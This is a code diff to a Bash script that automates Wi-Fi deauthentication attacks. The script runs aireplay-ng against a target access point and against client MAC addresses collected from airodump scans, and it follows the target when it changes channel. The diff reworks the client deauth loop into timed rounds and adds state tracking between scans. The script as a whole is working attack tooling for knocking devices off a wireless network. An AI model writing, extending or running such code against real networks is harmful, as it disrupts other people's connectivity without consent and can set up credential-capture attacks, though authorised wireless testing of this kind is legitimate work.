@@ -97,6 +97,10 @@ SCANS_IGNORED=0
 SCANS_FAIL=0
 START_TS="$(date +%s)"
 ENABLE_ERROR_LOG=0
+ROUND_ACTIVE=0
+COLLECTING=0
+NEED_QC_AFTER_ROUND=1
+ROUND_NEXT_TS=0
 
 # ----------------------------- Helpers ----------------------------
 log_err() {
@@ -170,7 +174,7 @@ ensure_monitor() {
   return 0
 }
 
-get_pgid() { ps -o pgid= -p "$1" 2>/dev/null | tr -d '[:space:]'; }
+get_pgid() { ps -o pgid= -p "$1" 2>/dev/null | tr -d '[:space:]' || true; }
 
 kill_group_strong() {
   # args: pgid(neg ok), pid, broom_pattern(optional)
@@ -467,27 +471,27 @@ iw_set_channel() {
 }
 
 # ---------------- Deauth control + log monitor -------------------
-stop_client_deauth_loop() {
+stop_client_round() {
   if [[ -n "$CLIENT_LOOP_PGID" || -n "$CLIENT_LOOP_PID" ]]; then
     local broom=""
     [[ -n "${INTERFACE:-}" ]] && broom="aireplay-ng .* -c .* ${INTERFACE}"
-    echo "[*] Stopping client deauth loop..."
+    echo "[*] Stopping client deauth round..."
     kill_group_strong "$CLIENT_LOOP_PGID" "$CLIENT_LOOP_PID" "$broom"
     CLIENT_LOOP_PGID=""; CLIENT_LOOP_PID=""
   fi
 }
 
-start_client_deauth_loop() {
+start_client_round() {
   # args: iface, bssid
   local ifc="$1" bssid="$2"
   [[ -z "$CLIENTS_FILE" ]] && return 0
-  stop_client_deauth_loop
+  stop_client_round
 
   _SPAWNING=1
   # shellcheck disable=SC2016
   setsid bash -c '
     set -euo pipefail
-    ifc="$1"; bssid="$2"; clients_file="$3"; deauth_count="$4"; round_secs="$5"; cmd_timeout="$6"
+    ifc="$1"; bssid="$2"; clients_file="$3"; deauth_count="$4"; cmd_timeout="$5"
 
     log() { printf "[CLIENT] %s\n" "$*"; }
 
@@ -515,34 +519,24 @@ start_client_deauth_loop() {
       log "Deauth end: ${client}"
     }
 
-    while true; do
-      round_start="$(date +%s)"
-      clients=()
-      if [[ -f "$clients_file" ]]; then
-        while IFS= read -r c; do
-          [[ -n "$c" ]] && clients+=( "$c" )
-        done < "$clients_file"
-      fi
+    clients=()
+    if [[ -f "$clients_file" ]]; then
+      while IFS= read -r c; do
+        [[ -n "$c" ]] && clients+=( "$c" )
+      done < "$clients_file"
+    fi
 
-      round_has_clients=0
-      if (( ${#clients[@]} > 0 )); then
-        round_has_clients=1
-        log "Round start: ${#clients[@]} client(s)"
-      fi
-      for c in "${clients[@]}"; do
-        run_client_once "$c" "$ifc" "$bssid" "$deauth_count" "$cmd_timeout"
-      done
-
-      if (( round_has_clients == 1 )); then
-        log "Round end"
-      fi
-      round_end="$(date +%s)"
-      elapsed=$((round_end - round_start))
-      if (( elapsed < round_secs )); then
-        sleep $((round_secs - elapsed))
-      fi
+    if (( ${#clients[@]} > 0 )); then
+      log "Round start: ${#clients[@]} client(s)"
+    fi
+    for c in "${clients[@]}"; do
+      run_client_once "$c" "$ifc" "$bssid" "$deauth_count" "$cmd_timeout"
     done
-  ' -- "$ifc" "$bssid" "$CLIENTS_FILE" "$CLIENT_DEAUTH_COUNT" "$CLIENT_ROUND_SECS" "$CLIENT_CMD_TIMEOUT" &
+
+    if (( ${#clients[@]} > 0 )); then
+      log "Round end"
+    fi
+  ' -- "$ifc" "$bssid" "$CLIENTS_FILE" "$CLIENT_DEAUTH_COUNT" "$CLIENT_CMD_TIMEOUT" &
   CLIENT_LOOP_PID="$!"
   local realpg; realpg="$(get_pgid "$CLIENT_LOOP_PID")"
   CLIENT_LOOP_PGID="-$CLIENT_LOOP_PID"; [[ -n "$realpg" ]] && CLIENT_LOOP_PGID="-$realpg"
@@ -550,7 +544,7 @@ start_client_deauth_loop() {
 }
 
 stop_deauth() {
-  stop_client_deauth_loop
+  stop_client_round
   clear_clients_file
   clear_pending_clients
   if [[ -n "$DEAUTH_MON_PGID" || -n "$DEAUTH_MON_PID" ]]; then
@@ -562,12 +556,15 @@ stop_deauth() {
     kill_group_strong "$DEAUTH_PGID" "$DEAUTH_PID" "aireplay-ng .* ${INTERFACE}"
     DEAUTH_PGID=""; DEAUTH_PID=""
   fi
+  ROUND_ACTIVE=0
+  COLLECTING=0
+  NEED_QC_AFTER_ROUND=1
+  ROUND_NEXT_TS=0
 }
 
 start_deauth() {
   # args: iface, bssid, ch
   local ifc="$1" bssid="$2" ch="$3"
-  activate_pending_clients
   : > "$DEAUTH_LOG"
   : > "$CH_DEAUTH_COUNT_FILE"
   [[ -f "$TOT_DEAUTH_COUNT_FILE" ]] || echo 0 > "$TOT_DEAUTH_COUNT_FILE"
@@ -618,7 +615,6 @@ start_deauth() {
 
   CURRENT_CH="$ch"
   CURRENT_BSSID="$bssid"
-  start_client_deauth_loop "$ifc" "$bssid"
   echo "[*] Deauth started on ch $CURRENT_CH for $CURRENT_BSSID"
   write_status
 }
@@ -699,11 +695,23 @@ KNOWN_BSSID="${TARGET_BSSID:-}"
 while true; do
   ensure_monitor "$INTERFACE" || { echo "[!] Monitor mode unavailable... retrying..."; sleep 1; continue; }
 
+  now="$(date +%s)"
+  if (( ROUND_ACTIVE == 1 )); then
+    if [[ -z "$CLIENT_LOOP_PID" ]] || ! kill -0 "$CLIENT_LOOP_PID" 2>/dev/null; then
+      CLIENT_LOOP_PID=""; CLIENT_LOOP_PGID=""
+      ROUND_ACTIVE=0
+      NEED_QC_AFTER_ROUND=1
+      COLLECTING=0
+    fi
+  fi
+
   FOUND_MODE=""
   RES_LINE=""
+  did_quick_confirm=0
 
   # Quick confirm if we have a hint
   if [[ -n "${KNOWN_CH:-}" || -n "${CURRENT_CH:-}" ]]; then
+    did_quick_confirm=1
     local_ch="${KNOWN_CH:-$CURRENT_CH}"
     echo "[SCAN] Quick confirm on ch $local_ch..."
     RES_LINE="$(run_airodump_until_found "$INTERFACE" "$KNOWN_BSSID" "$TARGET_SSID" "$QUICK_CONFIRM" "$local_ch")"
@@ -712,6 +720,13 @@ while true; do
       IGNORED)   FOUND_MODE="IGNORED" ;;
       TIMEOUT)   FOUND_MODE="TIMEOUT" ;;
     esac
+  fi
+
+  if (( did_quick_confirm == 1 && NEED_QC_AFTER_ROUND == 1 && ROUND_ACTIVE == 0 )); then
+    NEED_QC_AFTER_ROUND=0
+    if (( ROUND_NEXT_TS == 0 || now < ROUND_NEXT_TS )); then
+      COLLECTING=1
+    fi
   fi
 
   # Full scan otherwise
@@ -734,28 +749,31 @@ while true; do
 
     KNOWN_CH="$NEW_CH"; KNOWN_BSSID="$NEW_BSSID"
 
-    restart_deauth=0
     if [[ -z "$DEAUTH_PGID" ]]; then
-      restart_deauth=1
+      start_deauth "$INTERFACE" "$KNOWN_BSSID" "$KNOWN_CH" || true
+      now="$(date +%s)"
+      if (( ROUND_NEXT_TS == 0 )); then
+        ROUND_NEXT_TS=$((now + CLIENT_ROUND_SECS))
+      fi
     else
       if [[ "$CURRENT_CH" != "$KNOWN_CH" ]]; then
         echo "[*] Channel changed: ${CURRENT_CH} -> ${KNOWN_CH}. Restarting deauth..."
         stop_deauth
-        restart_deauth=1
+        start_deauth "$INTERFACE" "$KNOWN_BSSID" "$KNOWN_CH" || true
+        now="$(date +%s)"
+        if (( ROUND_NEXT_TS == 0 )); then
+          ROUND_NEXT_TS=$((now + CLIENT_ROUND_SECS))
+        fi
       elif [[ "$CURRENT_BSSID" != "$KNOWN_BSSID" ]]; then
         echo "[*] Target BSSID changed: ${CURRENT_BSSID} -> ${KNOWN_BSSID}. Restarting deauth..."
         stop_deauth
-        restart_deauth=1
+        start_deauth "$INTERFACE" "$KNOWN_BSSID" "$KNOWN_CH" || true
+        now="$(date +%s)"
+        if (( ROUND_NEXT_TS == 0 )); then
+          ROUND_NEXT_TS=$((now + CLIENT_ROUND_SECS))
+        fi
       fi
     fi
-    csv_file="$(latest_csv || true)"
-    if [[ -n "$csv_file" && -n "$KNOWN_BSSID" ]]; then
-      merge_clients_from_csv "$csv_file" "$KNOWN_BSSID" "$CLIENTS_PENDING_FILE"
-    fi
-    if (( restart_deauth == 1 )); then
-      start_deauth "$INTERFACE" "$KNOWN_BSSID" "$KNOWN_CH" || true
-    fi
-    write_status
 
   elif [[ "$FOUND_MODE" == "IGNORED" ]]; then
     SCANS_IGNORED=$((SCANS_IGNORED+1))
@@ -765,15 +783,33 @@ while true; do
       echo "[SCAN] Two consecutive unknown channels. Stopping deauth."
       stop_deauth
     fi
-    write_status
 
   else
     SCANS_FAIL=$((SCANS_FAIL+1))
     UNKNOWN_CH_STREAK=0
     echo "[SCAN] Target not found this round."
     stop_deauth
-    write_status
   fi
 
+  if (( COLLECTING == 1 && ROUND_ACTIVE == 0 )) && [[ -n "$KNOWN_BSSID" ]]; then
+    csv_file="$(latest_csv || true)"
+    if [[ -n "$csv_file" ]]; then
+      merge_clients_from_csv "$csv_file" "$KNOWN_BSSID" "$CLIENTS_PENDING_FILE"
+    fi
+  fi
+
+  now="$(date +%s)"
+  if (( ROUND_ACTIVE == 0 )) && [[ -n "$DEAUTH_PGID" ]] && (( ROUND_NEXT_TS > 0 )) && (( now >= ROUND_NEXT_TS )); then
+    if (( NEED_QC_AFTER_ROUND == 0 )) && [[ -n "$KNOWN_BSSID" ]]; then
+      activate_pending_clients
+      clear_pending_clients
+      COLLECTING=0
+      ROUND_ACTIVE=1
+      ROUND_NEXT_TS=$((now + CLIENT_ROUND_SECS))
+      start_client_round "$INTERFACE" "$KNOWN_BSSID"
+    fi
+  fi
+
+  write_status
   sleep "$SLEEP_BETWEEN"
 done
